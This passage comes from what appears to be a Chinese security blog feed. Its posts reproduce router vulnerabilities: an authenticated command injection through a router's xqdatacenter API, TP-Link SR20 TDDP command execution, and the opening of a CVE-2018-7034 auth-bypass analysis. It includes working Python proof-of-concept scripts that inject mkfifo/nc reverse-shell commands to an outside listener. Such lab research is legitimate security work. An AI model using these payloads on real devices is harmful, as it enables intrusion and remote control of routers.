class="string">&quot;|||0;path=/;&quot;</span></span><br><span class="line">      L10 = L10 .. L11 .. L12 .. L13 .. L14</span><br><span class="line">      L8(L9, L10)</span><br><span class="line">      L8 = L4</span><br><span class="line">      L9 = L7</span><br><span class="line">      <span class="keyword">return</span> L8, L9</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      L7 = context</span><br><span class="line">      L8 = &#123;&#125;</span><br><span class="line">      L7.<span class="built_in">path</span> = L8</span><br><span class="line">      L7 = luci</span><br><span class="line">      L7 = L7.http</span><br><span class="line">      L7 = L7.<span class="built_in">write</span></span><br><span class="line">      L8 = <span class="string">&quot;&#123;\&quot;code\&quot;:401,\&quot;msg\&quot;:\&quot;Invalid token\&quot;&#125;&quot;</span></span><br><span class="line">      L7(L8)</span><br><span class="line">      L7 = <span class="literal">false</span></span><br><span class="line">      <span class="keyword">return</span> L7</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  L7 = context</span><br><span class="line">  L8 = &#123;&#125;</span><br><span class="line">  L7.<span class="built_in">path</span> = L8</span><br><span class="line">  L7 = luci</span><br><span class="line">  L7 = L7.http</span><br><span class="line">  L7 = L7.<span class="built_in">write</span></span><br><span class="line">  L8 = <span class="string">&quot;&#123;\&quot;code\&quot;:401,\&quot;msg\&quot;:\&quot;not auth\&quot;&#125;&quot;</span></span><br><span class="line">  L7(L8)</span><br><span class="line">  L7 = <span class="literal">false</span></span><br><span class="line">  <span class="keyword">return</span> L7</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">L10.jsonauth = L11</span><br></pre></td></tr></table></figure><p>可以看到这就是鉴权的函数，首先引入XQSysUtil模块，用于系统工具函数，之后便是获取 HTTP 请求中的 <code>username</code>, <code>password</code>, <code>nonce</code> 参数，如果有nonce参数，那么就调用<code>_UPVALUE0_.checkNonce</code>函数来检查nonce参数，如果通过checknonce的检查就会执行checkUser(usrname,nonce,password)，也通过了那就正常返回，不然就失败。因此要通过两个函数的检查，checknonce便不必多说，只看checkUser函数</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L13</span><span class="params">(A0, A1, A2)</span></span></span><br><span class="line">  <span class="keyword">local</span> L3, L4, L5, L6, L7, L8, L9</span><br><span class="line">  L3 = _UPVALUE0_</span><br><span class="line">  L3 = L3.get</span><br><span class="line">  L4 = A0</span><br><span class="line">  L5 = <span class="literal">nil</span></span><br><span class="line">  L6 = <span class="string">&quot;account&quot;</span></span><br><span class="line">  L3 = L3(L4, L5, L6)</span><br><span class="line">  <span class="keyword">if</span> L3 <span class="keyword">then</span></span><br><span class="line">    L4 = _UPVALUE1_</span><br><span class="line">    L4 = L4.isStrNil</span><br><span class="line">    L5 = A2</span><br><span class="line">    L4 = L4(L5)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> L4 <span class="keyword">then</span></span><br><span class="line">      L4 = _UPVALUE1_</span><br><span class="line">      L4 = L4.isStrNil</span><br><span class="line">      L5 = A1</span><br><span class="line">      L4 = L4(L5)</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> L4 <span class="keyword">then</span></span><br><span class="line">        L4 = _UPVALUE2_</span><br><span class="line">        L4 = L4.sha1</span><br><span class="line">        L5 = A1</span><br><span class="line">        L6 = L3</span><br><span class="line">        L5 = L5 .. L6</span><br><span class="line">        L4 = L4(L5)</span><br><span class="line">        <span class="keyword">if</span> L4 == A2 <span class="keyword">then</span></span><br><span class="line">          L4 = <span class="literal">true</span></span><br><span class="line">          <span class="keyword">return</span> L4</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  L4 = _UPVALUE3_</span><br><span class="line">  L4 = L4.<span class="built_in">log</span></span><br><span class="line">  L5 = <span class="number">4</span></span><br><span class="line">  L6 = luci</span><br><span class="line">  L6 = L6.http</span><br><span class="line">  L6 = L6.<span class="built_in">getenv</span></span><br><span class="line">  L7 = <span class="string">&quot;REMOTE_ADDR&quot;</span></span><br><span class="line">  L6 = L6(L7)</span><br><span class="line">  L6 = L6 <span class="keyword">or</span> L6</span><br><span class="line">  L7 = <span class="string">&quot; Authentication failed&quot;</span></span><br><span class="line">  L6 = L6 .. L7</span><br><span class="line">  L7 = A1</span><br><span class="line">  L8 = L3</span><br><span class="line">  L9 = A2</span><br><span class="line">  L4(L5, L6, L7, L8, L9)</span><br><span class="line">  L4 = <span class="literal">false</span></span><br><span class="line">  <span class="keyword">return</span> L4</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">checkUser = L13</span><br></pre></td></tr></table></figure><p>首先用get函数获得account.comman.usrname，要求不为空，然后通过与Post报文传入的nonce现时字段拼接后sha1哈希加密之后便是Post报文中的密码了，那我们来看Post报文的密码字段</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657081.png" alt="image-20240712102435885"></p><p>可以看到用户名恒为admin，然后password要通过oldpw来加密</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657083.png" alt="image-20240712102549234"></p><p>可以看到它return了一个sha1加密内容是（nonce字段+sha1(pwd+key)）Key便是上面的一串，pwd便是传入的密码，由于在lua文件中处理密码也会加拼接上一个nonce字段，那相当于是没拼接，那么只需要我们的account.common.admin是sha1(s1nec-1o+key)，那么我们的密码便是s1nec-1o了</p><p>由于本文的cve是授权后的，因此要有密码才可以复现</p><p>鉴权完成之后那我们就要继续研究漏洞了，还是看到api控制模块的</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">L1 = entry                                   <span class="comment">--request processing</span></span><br><span class="line">L2 = &#123;&#125;</span><br><span class="line">L3 = <span class="string">&quot;api&quot;</span></span><br><span class="line">L4 = <span class="string">&quot;xqdatacenter&quot;</span></span><br><span class="line">L5 = <span class="string">&quot;request&quot;</span></span><br><span class="line">L2[<span class="number">1</span>] = L3</span><br><span class="line">L2[<span class="number">2</span>] = L4</span><br><span class="line">L2[<span class="number">3</span>] = L5</span><br><span class="line">L3 = call</span><br><span class="line">L4 = <span class="string">&quot;tunnelRequest&quot;</span></span><br><span class="line">L3 = L3(L4)</span><br><span class="line">L4 = _</span><br><span class="line">L5 = <span class="string">&quot;&quot;</span></span><br><span class="line">L4 = L4(L5)</span><br><span class="line">L5 = <span class="number">301</span></span><br><span class="line">L1(L2, L3, L4, L5)    <span class="comment">---entry( &#123;&quot;api&quot;,&quot;xqdatacenter&quot;,&quot;request&quot;&#125; , call(tunnelRequest) , _&quot;&quot; , 301 )</span></span><br></pre></td></tr></table></figure><p>其中在访问xqdatacenter该节点的时候会call(tunnelRequest)来对json数据进行解析</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L5</span><span class="params">()</span></span>          <span class="comment">--tunnelRequest Function</span></span><br><span class="line">  <span class="keyword">local</span> L0, L1, L2, L3, L4, L5, L6, L7, L8</span><br><span class="line">  L0 = <span class="built_in">require</span></span><br><span class="line">  L1 = <span class="string">&quot;xiaoqiang.util.XQCryptoUtil&quot;</span></span><br><span class="line">  L0 = L0(L1)         <span class="comment">--load xiaoqiang.util.XQCryptoUtil module</span></span><br><span class="line">  L1 = L0.binaryBase64Enc              <span class="comment">--call binaryBase64Enc Function</span></span><br><span class="line">  L2 = _UPVALUE0_</span><br><span class="line">  L2 = L2.formvalue_unsafe</span><br><span class="line">  L3 = <span class="string">&quot;payload&quot;</span></span><br><span class="line">  L2, L3, L4, L5, L6, L7, L8 = L2(L3)       <span class="comment">--formvalue_unsafe(payload)</span></span><br><span class="line">  L1 = L1(L2, L3, L4, L5, L6, L7, L8)       <span class="comment">--Base func retuen L1</span></span><br><span class="line">  L2 = _UPVALUE1_</span><br><span class="line">  L2 = L2.THRIFT_TUNNEL_TO_DATACENTER       <span class="comment">--thrifttunnel 0 &#x27;%s&#x27;</span></span><br><span class="line">  L2 = L2 % L1                              <span class="comment">---L1 tick to L2</span></span><br><span class="line">  L3 = <span class="built_in">require</span></span><br><span class="line">  L4 = <span class="string">&quot;luci.util&quot;</span></span><br><span class="line">  L3 = L3(L4)            <span class="comment">--load luci.util module</span></span><br><span class="line">  L4 = _UPVALUE0_</span><br><span class="line">  L4 = L4.<span class="built_in">write</span></span><br><span class="line">  L5 = L3.exec</span><br><span class="line">  L6 = L2</span><br><span class="line">  L5 = L5(L6)   <span class="comment">--luci.util&#x27;s exec Func (tunnel cmd)</span></span><br><span class="line">  L6 = <span class="literal">nil</span></span><br><span class="line">  L7 = <span class="literal">false</span></span><br><span class="line">  L8 = <span class="literal">true</span></span><br><span class="line">  L4(L5, L6, L7, L8)   <span class="comment">--write may ret</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">tunnelRequest = L5</span><br></pre></td></tr></table></figure><p>其中调用了XQCryptoUtil的binaryBase64Enc和formvalue_unsafe，猜测是先base64加密然后用formvalue_unsafe来获取内容吧，显然是一个危险函数，未过滤危险字符，而THRIFT_TUNNEL_TO_DATACENTER的含义可以在&#x2F;usr&#x2F;lib&#x2F;lua&#x2F;xiaoqiang&#x2F;common&#x2F;XQConfigs.lua中找到<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657084.png" alt="image-20240712104352614" style="zoom:50%;" /></p><p>因此最终的string是<code>thrifttunnel 0 &#39;base64加密的payload&#39;</code>之后使用luci.util的exec来执行该命令，因此payload字段中被Base64编码的json数据会被传入thrifttunnel程序中且opetion为0</p><h2 id="二进制文件分析"><a href="#二进制文件分析" class="headerlink" title="二进制文件分析"></a>二进制文件分析</h2><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657085.png" alt="image-20240712110152526"></p><p>会发现在thrifttunnel程序中他将数据发送到了本地端的9090端口，而&#x2F;usr&#x2F;lib&#x2F;datacenter程序一直监听着9090端口，因此我们的数据会到datacenter中去处理</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657086.png" alt="image-20240712110442769"></p><p>这个函数显然就是监听的函数，看datacenter的request函数</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657087.png" alt="image-20240712163626431"></p><p>调用了APIMapping和redirectRequest函数</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657088.png" alt="image-20240712163658072"></p><p>APIMaping中调用了constructAPIMappingTable函数，它建立起了api和handle函数之间的关系</p><p>在redirect函数中<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657089.png" alt="image-20240712164126303"></p><p>先获取json对象的api字段的值，存放在v8变量中，之后的循环时map.find()的调用的反汇编，其中偏移+32是第一个键值即api，+40便是对应的handle函数指针，因此显然可以知道上面便是api为多少就会调用哪里的函数</p><p>看到漏洞所在处，可以知道当api为629时出问题，看到api为629的地方</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657090.png" alt="image-20240712164540707"></p><p>看函数调用关系可以找到<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657091.png" alt="image-20240712164623136"></p><p>它连接了9091端口，然后发现plugincenter监听了9091端口，可以得知数据会被转发到plugincenter来处理</p><p>找到plugincenter然后看sConstructMappingTable函数，就可以找到当api为629调用了parseGetIdForVendor函数</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657092.png" alt="image-20240712164913808"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407121657093.png" alt="image-20240712165122840"></p><p>发现就算是非法的app id也会拼接到命令然后执行，因此就有个任意命令执行的漏洞</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/datacenter &amp;</span><br><span class="line">/usr/sbin/plugincenter &amp;</span><br></pre></td></tr></table></figure><p>先将服务开启</p><p>然后执行Poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">server_ip = <span class="string">&quot;192.168.50.1&quot;</span></span><br><span class="line">client_ip = <span class="string">&quot;192.168.50.105&quot;</span></span><br><span class="line">token = <span class="string">&quot;814c55713043e7358d3c1f42f2a98438&quot;</span></span><br><span class="line"></span><br><span class="line">nc_shell = <span class="string">&quot;;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &#123;&#125; 8888 &gt;/tmp/f;&quot;</span>.<span class="built_in">format</span>(client_ip)</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&quot;http://&#123;&#125;/cgi-bin/luci/;stok=&#123;&#125;/api/xqdatacenter/request&quot;</span>.<span class="built_in">format</span>(server_ip, token), data=&#123;<span class="string">&#x27;payload&#x27;</span>:<span class="string">&#x27;&#123;&quot;api&quot;:629, &quot;appid&quot;:&quot;&#x27;</span> + nc_shell + <span class="string">&#x27;&quot;&#125;&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>此时做到反弹shell了</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://forum.butian.net/share/3000">https://forum.butian.net/share/3000</a></p><p><a href="https://bbs.kanxue.com/thread-282034.htm">https://bbs.kanxue.com/thread-282034.htm</a></p><p><a href="https://zikh26.github.io/posts/3d9490d.html">https://zikh26.github.io/posts/3d9490d.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这个cve是我至今以来复现的最为复杂的漏洞了，winmt真神！&lt;/p&gt;
&lt;h2 id=&quot;固件仿真&quot;&gt;&lt;a href=&quot;#固件仿真&quot; class=&quot;headerlink&quot; title=&quot;固件仿真&quot;&gt;&lt;/a&gt;固件仿真&lt;/h2&gt;&lt;p&gt;首先固件的提取可以看&lt;a href=&quot;http</summary>
      
    
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>TP-Link SR20命令执行漏洞复现</title>
    <link href="http://s1nec-1o.github.io/2024/07/09/TP-Link-SR20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2024/07/09/TP-Link-SR20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-07-09T10:31:57.000Z</published>
    <updated>2024-07-09T10:33:18.195Z</updated>
    
    <content type="html"><![CDATA[<p>这个漏洞的成因是因为他的TDDP本身协议有任意命令执行的漏洞</p><h2 id="TDDP协议"><a href="#TDDP协议" class="headerlink" title="TDDP协议"></a>TDDP协议</h2><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832867.png" alt="image-20240709180753701"></p><p>基于UDP协议，端口为1040端口</p><p>以上为TDDP协议的报头，第一个字节为version，即版本。tddp协议有两个版本：<code>version1</code>和<code>version2</code>。其中<code>version1</code>不支持身份验证和对数据包载荷的加密，而<code>version2</code>要求身份验证和加密。也正是因为<code>version1</code>不要求身份的认证即可对设备进行调试，导致出现漏洞。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>是arm32小端，已经qemu过很多固件了，就不再多赘述，也不会很复杂</p><p>启动脚本如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line">    -M vexpress-a9 \</span><br><span class="line">    -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">    -initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">    -drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot;</span> \</span><br><span class="line">    -net nic -net tap \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><h2 id="二进制文件的分析"><a href="#二进制文件的分析" class="headerlink" title="二进制文件的分析"></a>二进制文件的分析</h2><p>首先是由tddp协议出问题，然后是0x31的type</p><p>在&#x2F;usr&#x2F;bin&#x2F;tddp里</p><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832868.png" alt="image-20240709181137853"></p><p>main函数中有三个函数，大致看一眼发现，sub_16C90是初始化堆块，sub_16D40是释放内存，那么主要的操作在sub_93C6</p><h3 id="sub-93C6"><a href="#sub-93C6" class="headerlink" title="sub_93C6"></a>sub_93C6</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832869.png" alt="image-20240709181427771"></p><p>他的主要处理是来自tddp_type_handle函数</p><h3 id="tddp-type-handle"><a href="#tddp-type-handle" class="headerlink" title="tddp_type_handle"></a>tddp_type_handle</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832870.png" alt="image-20240709181523845"></p><p>看version为1的情况</p><h3 id="tddp-type-version1-handle"><a href="#tddp-type-version1-handle" class="headerlink" title="tddp_type_version1_handle"></a>tddp_type_version1_handle</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832871.png" alt="image-20240709181605477"></p><p>进来发现是处理type的部分，那么找到0x31的部分进入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x31</span>:</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] TDDPv1: receive CMD_FTEST_CONFIG\n&quot;</span>, <span class="string">&quot;tddp_parserVerOneOpt&quot;</span>, <span class="number">692</span>);</span><br><span class="line">  v9 = sub_A580((<span class="type">int</span>)a1);</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>主要是sub_A580函数</p><h3 id="sub-A580"><a href="#sub-A580" class="headerlink" title="sub_A580"></a>sub_A580</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832872.png" alt="image-20240709181955545"></p><p>由这里可以知道，主要是从version+12开始会组合一个命令执行</p><p>其中sub_91DC函数中</p><h3 id="sub-91DC"><a href="#sub-91DC" class="headerlink" title="sub_91DC"></a>sub_91DC</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832873.png" alt="image-20240709182052280"></p><p>会执行sh -c s</p><p>其中s是传入的命令执行，那么我们可以通过|分割来进行任意命令执行</p><p>并且还有一种方式</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407091832874.png" alt="image-20240709182211053"></p><p>会用tftp下载一个文件，然后通过lua的方式执行config_test函数，那么我们就可以本地伪造一个lua文件其中包括一个config_test函数，也能实现任意命令执行</p><p>那么这样看来payload还是很好写的</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payloda=<span class="string">&quot;/x01/x31&quot;</span>.ljust(<span class="string">b&#x27;\x00&#x27;</span>,<span class="number">12</span>)+command</span><br></pre></td></tr></table></figure><p>那么就可以简单的复现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">ss= socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x01\x31&#x27;</span>.ljust(<span class="number">12</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&quot;| mkfifo /tmp/fifo | sh -i &lt; /tmp/fifo | nc 192.168.121.112 8888 &gt; /tmp/fifo |;s1nec-1o&quot;</span></span><br><span class="line">ss.sendto(payload, (ip, <span class="number">1040</span>))</span><br><span class="line">ss.close()</span><br></pre></td></tr></table></figure><p>由于反弹shell如此麻烦是因为我传入的是busybox的nc，它的使用方法较少，这是能想到的一个方法，但是反弹出来会显示段错误，不懂，但想来如果是真机也不用如此麻烦，或者将宿主机的nc传入吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">tddp_port = <span class="number">1040</span></span><br><span class="line">ip = sys.argv[<span class="number">1</span>] <span class="comment"># 192.168.192.130 (QEMU虚拟机的IP)</span></span><br><span class="line">command = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">s_send = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x01\x31&#x27;</span>.ljust(<span class="number">12</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&quot;%s;winmt&quot;</span> % command</span><br><span class="line">s_send.sendto(payload, (ip, tddp_port))</span><br><span class="line">s_send.close()</span><br></pre></td></tr></table></figure><p>还得是winmt，脚本都那么优雅</p><p>至于lua文件的执行，想来也是差不多的编写脚本思路</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.iotsec-zone.com/article/384#tp-link-sr20-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">winmt</a></p><p><a href="https://xz.aliyun.com/t/6073?time__1311=n4+xnD0DgDcmG=N0QD/iW4BKGQYw4gouDDv5PQx#toc-0">TP Link SR20 ACE漏洞分析 - 先知社区 (aliyun.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这个漏洞的成因是因为他的TDDP本身协议有任意命令执行的漏洞&lt;/p&gt;
&lt;h2 id=&quot;TDDP协议&quot;&gt;&lt;a href=&quot;#TDDP协议&quot; class=&quot;headerlink&quot; title=&quot;TDDP协议&quot;&gt;&lt;/a&gt;TDDP协议&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https:</summary>
      
    
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-7034复现</title>
    <link href="http://s1nec-1o.github.io/2024/07/08/CVE-2018-7034%E5%A4%8D%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2024/07/08/CVE-2018-7034%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-07-08T04:40:48.000Z</published>
    <updated>2024-07-08T04:44:26.135Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244908.png" alt="image-20240708110008200"></p><p>通过使用 <code>AUTHORIZED_GROUP=1</code> 值，攻击者可以绕过认证，如通过请求 <code>getcfg.php</code> 进行信息泄露</p><p>这个cve的成因，主要是因为解析%xx和判断环境变量的不严谨导致的，以下分析</p><h2 id="php文件的分析"><a href="#php文件的分析" class="headerlink" title="php文件的分析"></a>php文件的分析</h2><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202407081244910.png" alt="image-20240708110317494"></p><p>可以看到如果Authorized_group&gt;&#x3D;0即代表用户授权，可以加载一个file，而这个file是<code>&quot;/htdocs/webinc/getcfg/&quot;.$GETCFG_SVC.&quot;.xml.php&quot;</code>的格式，那么我们看到在该目录下的以.xml.php为后缀的文件，<code>DEVICE.ACCOUNT.xml.php</code> 该文件可以泄露用户名和密码等信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="string">&quot;/device/account/entry&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$InDeX</span> &gt; <span class="variable">$cnt</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t&lt;entry&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;uid&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;uid&quot;</span>).<span class="string">&quot;&lt;/uid&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;name&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;name&quot;</span>).<span class="string">&quot;&lt;/name&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\t\t\t\t&lt;usrid&gt;&quot;</span>.<span class="title function_ invoke__">get</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;usrid&quot;</span>).<span class="string">&quot;&lt;/usrid&gt;\n&quot;</span>;</span><br><span class="line"><span 